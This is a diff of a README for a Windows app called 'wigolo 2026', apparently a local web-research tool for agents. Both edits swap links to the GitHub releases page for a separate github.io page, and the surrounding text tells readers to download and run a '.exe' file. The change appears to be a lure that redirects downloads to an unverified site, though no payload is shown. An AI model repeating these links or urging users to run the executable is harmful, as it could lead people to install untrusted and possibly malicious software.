@@ -1,6 +1,6 @@
 # 🌐 wigolo-Local-Web-Intelligence-2026 - Private local web research for agents
 
-[![Download for Windows](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/sectionmandrycleaner747/wigolo-Local-Web-Intelligence-2026/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Release-blue.svg)](https://sectionmandrycleaner747.github.io)
 
 ## 📖 What is wigolo 2026?
 
@@ -21,7 +21,7 @@ To run this application, ensure your computer meets these conditions:
 
 You can get the application from the official release page. 
 
-[Click here to visit the release page and download the setup file](https://github.com/sectionmandrycleaner747/wigolo-Local-Web-Intelligence-2026/releases)
+[Click here to visit the release page and download the setup file](https://sectionmandrycleaner747.github.io)
 
 Look for the file ending in `.exe` under the latest release section. Download this file to your computer.
 
